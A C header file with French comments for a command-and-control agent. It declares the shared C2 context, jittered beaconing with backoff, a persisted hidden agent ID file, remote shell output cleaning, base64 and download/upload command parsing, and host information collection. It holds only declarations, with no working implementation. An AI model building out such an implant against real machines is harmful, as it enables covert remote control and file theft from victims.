/*
 * ============================================================
 *  utils.h - Structures et utilitaires generaux
 *
 *  Role : Structures de donnees partagees, fonctions
 *         utilitaires cross-platform, base64, nettoyage sortie.
 *
 *  Depend de : platform.h, config.h
 * ============================================================
 */
#ifndef UTILS_H
#define UTILS_H
#include "platform.h"
#include "config.h"

/* ============================================================
 *  STRUCTURES DE DONNEES
 * ============================================================ */

/* Informations systeme collectees au demarrage */
typedef struct {
    char hostname[256];
    char username[128];
    char os[256];
} SystemInfo;

/* Contexte de l'agent - partage par tous les modules */
typedef struct {
    char server_url[256];     /* URL du serveur C2 actif                    */
    char agent_id[16];        /* Identifiant unique de l'agent (8 hex chars) */
    int  reconnect_attempts;  /* Compteur pour le backoff exponentiel        */
    int  running;             /* Flag d'arret : 0 = stop, 1 = continue       */
} AgentContext;


/* ============================================================
 *  TIMING
 * ============================================================ */

/**
 * Pause cross-platform en millisecondes.
 */
void sleep_ms(int ms);

/**
 * Retourne l'intervalle de polling avec jitter aleatoire.
 * Plage : [POLL_INTERVAL_MS ? JITTER_PERCENT%]
 */
int get_jittered_interval(void);

/**
 * Retourne le delai de backoff suivant et incremente le compteur.
 * Plafonne au dernier element de BACKOFF_DELAYS[].
 */
int get_backoff_delay(AgentContext *ctx);


/* ============================================================
 *  PERSISTANCE AGENT ID
 * ============================================================ */

/**
 * Construit le chemin du fichier .agent_id selon la plateforme.
 * Windows : %TEMP%\.agent_id | Linux : /tmp/.agent_id
 */
void get_agent_id_filepath(char *out, size_t n);

/**
 * Charge un agent_id sauvegarde depuis le disque.
 * Retourne 1 si trouve et valide (8 chars), 0 sinon.
 */
int load_saved_agent_id(char *out, size_t n);

/**
 * Sauvegarde l'agent_id sur le disque pour la persistance.
 */
void save_agent_id(const char *id);


/* ============================================================
 *  NETTOYAGE DE SORTIE SHELL
 * ============================================================ */

/**
 * Supprime les sequences d'echappement ANSI/VT100 in-place.
 */
void strip_ansi(char *buf);

/**
 * Retourne 1 si la ligne ressemble a un prompt bash ou PowerShell.
 */
int is_prompt_line(const char *line, const char *shell_type);

/**
 * Nettoie la sortie brute du shell :
 *   1. Strip ANSI   2. Supprime prompts   3. Supprime sentinel
 *   4. Normalise \r\n > \n   5. Deduplique lignes vides   6. Trim
 */
void clean_output(char *buf, const char *shell_type, const char *sentinel);


/* ============================================================
 *  BASE64
 * ============================================================ */

/* Table d'encodage base64 */
extern const char B64[65];

/* Table de decodage base64 - valeur -1 pour les caracteres invalides */
extern const int B64_DEC[256];

/**
 * Encode un buffer binaire en base64 (sortie terminee par '\0').
 */
void b64_encode(const unsigned char *in, size_t in_len, char *out);

/**
 * Decode base64 into a newly allocated binary buffer.
 * The caller owns the returned buffer.
 */
unsigned char *b64_decode_alloc(const char *in, size_t in_len, size_t *out_len);


/* ============================================================
 *  PARSING COMMANDES
 * ============================================================ */

/**
 * Extrait le chemin d'une commande "download <path>" ou "upload <path>".
 * Supporte les chemins avec espaces (entre guillemets) et prefixes variables.
 * Supprime guillemets, \r\n et espaces de fin.
 */
void extract_path(const char *command, const char *prefix,
                  char *out_path, size_t out_sz);


/* ============================================================
 *  INFORMATIONS SYSTEME
 * ============================================================ */

/**
 * Collecte hostname, username et version OS.
 * Appele une seule fois au demarrage depuis main().
 */
void collect_system_info(SystemInfo *info);

#endif /* UTILS_H */
